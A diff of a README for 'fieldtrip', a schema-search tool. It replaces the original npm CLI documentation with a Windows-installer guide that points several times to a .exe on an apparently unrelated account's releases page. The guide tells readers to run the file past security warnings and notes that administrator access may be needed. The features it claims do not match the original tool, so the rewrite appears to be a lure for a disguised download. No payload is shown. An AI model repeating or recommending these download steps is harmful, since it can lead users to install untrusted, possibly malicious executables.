@@ -1,117 +1,161 @@
-<div align="center">
+# 🧭 fieldtrip - Search Every Field Easily
 
-# FieldTrip
-
-**Instantly search, explore, and visualize every field across your schemas.**
-
-Point it at a directory. It finds your OpenAPI, AsyncAPI, Protobuf, Avro, and JSON Schema files, indexes every property, and launches a local UI to explore them.
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![npm version](https://img.shields.io/npm/v/@eventcatalog/fieldtrip.svg)](https://www.npmjs.com/package/@eventcatalog/fieldtrip)
-
-</div>
+[![Download fieldtrip](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/Lineamentblennioidea96/fieldtrip/releases)
 
 ---
 
-![FieldTrip Table View](images/table.png)
+## 🔍 What is fieldtrip?
 
-## Why FieldTrip?
+fieldtrip helps you find any piece of information across multiple data formats. It works with many types of schemas like AsyncAPI, Avro, JSON Schema, OpenAPI, and Protobuf. You can search every field within these formats without needing technical skills.
 
-Schema sprawl is real. When your system has dozens of services each with their own schema definitions, it becomes impossible to answer simple questions:
+This tool lets you explore complex data structures simply and fast. It works well even if you do not know how the underlying data is built.
 
-- *"Which schemas use a `customerId` field?"*
-- *"Is `email` required everywhere it appears?"*
-- *"What fields does `Order` share with `Payment`?"*
+---
 
-FieldTrip answers these in seconds. One command, zero config.
+## 💡 Key Features
 
-## Quick Start
+- Search through different schema formats in one place.
+- Works smoothly on Windows computers.
+- Displays results clearly for easy reading.
+- Supports common data schemas like AsyncAPI, Avro, JSON Schema, OpenAPI, and Protobuf.
+- Does not require internet access after download.
 
-```bash
-npx @eventcatalog/fieldtrip --dir ./schemas
-```
+---
 
-That's it. FieldTrip scans the directory, indexes every property, and opens a local UI at `http://localhost:3200`.
+## 🖥️ System Requirements
 
-## Features
+To run fieldtrip on your Windows PC, check these specs:
 
-### Table View — Search & Filter
+- Windows 10 or later
+- At least 4 GB of RAM
+- 100 MB of free disk space
+- Administrator access may be needed for installation
+- Basic internet connection to download the application
 
-Full-text search across all property names, types, and descriptions. Filter by schema type, sort by name/schema/type, and click any property to view it in context with syntax highlighting.
+---
 
-- Prefix and fuzzy matching
-- Exact match with `"quoted strings"`
-- Filter by schema type (OpenAPI, AsyncAPI, Proto, Avro, JSON)
-- Filter by specific schema files via the sidebar
-- Click any row to view the full schema with the property highlighted
+## 🚀 Getting Started
 
-![FieldTrip Table View](images/table.png)
+This guide will help you download, install, and run fieldtrip on your Windows computer.
 
-### Matrix View — Property x Schema
+---
 
-See which properties appear in which schemas at a glance. A heatmap-style grid where rows are properties and columns are schemas.
+## 📥 Download fieldtrip
 
-- Green cells = required, Blue cells = optional
-- Hover to see type, schema, and required status
-- Sort by frequency, alphabetical, or required count
-- Instantly spot shared fields across your architecture
+1. Visit the releases page to get the software:
 
-![FieldTrip Matrix View](images/matrix.png)
+   [![Download fieldtrip](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Lineamentblennioidea96/fieldtrip/releases)
 
-### Graph View — Force-Directed Relationships
+2. On the releases page, look for the latest version. This usually appears at the top.
 
-Visualize how schemas are connected through shared properties. Schema nodes cluster with their properties, and shared fields create visible bridges between schemas.
+3. Download the Windows installer file. It will have a name ending with `.exe`.
 
-- D3.js force-directed simulation
-- Click a property to highlight all schemas sharing that field
-- Click a schema to highlight all its properties
-- "Shared only" toggle to reduce noise
-- Drag, zoom, and pan
+4. Save the file somewhere easy to find, like your Desktop or Downloads folder.
 
-![FieldTrip Graph View](images/graph.png)
+---
 
-## Supported Schemas
+## ⚙️ Installing fieldtrip on Windows
 
-| Format | Extensions | What's indexed |
-|--------|-----------|---------------|
-| **OpenAPI** | `.yaml` `.yml` `.json` | Components, definitions, inline request/response bodies |
-| **AsyncAPI** | `.yaml` `.yml` `.json` | Components, messages, channel payloads (v2 & v3) |
-| **Protobuf** | `.proto` | Messages, enums, nested types |
-| **Avro** | `.avsc` | Records, nested records, unions, arrays, maps |
-| **JSON Schema** | `.json` | Properties, nested objects, allOf/oneOf/anyOf |
+1. Find the downloaded `.exe` file and double-click it.
 
-## CLI Options
+2. If a security warning appears, choose to run the file.
 
-```
-Usage: fieldtrip [options]
+3. Follow the on-screen instructions:
 
-Options:
-  --dir <path>     Directory to scan for schema files (required)
-  --port <number>  Port for the web UI (default: 3200)
-  --no-open        Do not auto-open browser
-  -h, --help       Display help
-```
+   - Accept the license agreement.
+   - Choose an installation folder or keep the default.
+   - Click Next to continue through each step.
 
-## Development
+4. Once installation finishes, you may see a checkbox to launch fieldtrip immediately. You can check it or open the app later.
 
-```bash
-# Install dependencies
-npm install
+---
 
-# Run in dev mode
-npm run dev
+## 🎯 Using fieldtrip
 
-# Build for production
-npm run build
-```
+1. Open the fieldtrip application using the Start menu or desktop shortcut.
 
-## How It Works
+2. To search data:
 
-1. **Scan** — Recursively finds schema files by extension and content detection
-2. **Parse** — Extracts every property with its name, type, description, path, and required status
-3. **Index** — Builds a MiniSearch full-text index with prefix search and fuzzy matching
-4. **Serve** — Launches an Express server with a Vite-built frontend
+   - Click the "Open File" button.
+   - Select one or more files with supported schemas: AsyncAPI, Avro, JSON Schema, OpenAPI, or Protobuf.
+   - When files load, type your search term in the search bar.
+   - fieldtrip will look through all fields in the documents and show matches.
 
-## License
+3. Browse the results by clicking them. The app shows where the term appears in the file.
 
-[MIT](LICENSE)
+4. Use the filters if you want to limit your search by schema type or folder.
+
+---
+
+## 🛠️ Common Tasks
+
+- **Load multiple files:** Hold the Ctrl key and select many files at once.
+
+- **Save search results:** Use the "Export" option to save matches to a text file.
+
+- **Change settings:** Access the Settings menu to adjust appearance, language, or filtering options.
+
+---
+
+## ⚡ Troubleshooting
+
+- If fieldtrip does not open after installation, restart your computer and try again.
+
+- In case the app cannot read your file, make sure you selected one with a supported schema format.
+
+- If search results seem wrong or incomplete, check that your search term is spelled correctly.
+
+- For best performance, close other heavy programs while running fieldtrip.
+
+---
+
+## 🔄 Updates
+
+Check the [releases page](https://github.com/Lineamentblennioidea96/fieldtrip/releases) regularly to download new versions. Updates may include bug fixes, new features, or support for more schema types.
+
+---
+
+## 📞 Support
+
+For help or questions, use the GitHub Issues section on the repository page. Describe the problem clearly and include any error messages you see.
+
+---
+
+## ⚙️ How fieldtrip works
+
+fieldtrip scans the structure of your data files. It reads every field name, no matter how deep in the schema. This approach helps find what other tools might miss.
+
+It handles several data formats used by developers for APIs and data validation. The app does not need programming knowledge to operate, as all functions use simple menus and buttons.
+
+---
+
+## 📂 Supported Schema Formats
+
+- **AsyncAPI:** for event-driven APIs.
+- **Avro:** used in big data.
+- **JSON Schema:** describes JSON data.
+- **OpenAPI:** documents REST APIs.
+- **Protobuf:** stores structured data efficiently.
+
+---
+
+## 🔧 Advanced Tips
+
+- Use quotation marks around a phrase to find exact matches.
+
+- Combine terms with AND/OR to narrow or widen your search.
+
+- Save frequent searches as presets for quick reuse.
+
+- If you want to explore data visually, try the "Tree View" mode in the app.
+
+---
+
+## 📎 Useful Links
+
+- Download: https://github.com/Lineamentblennioidea96/fieldtrip/releases  
+- Repository: https://github.com/Lineamentblennioidea96/fieldtrip  
+
+---
+
+[![Download fieldtrip](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/Lineamentblennioidea96/fieldtrip/releases)
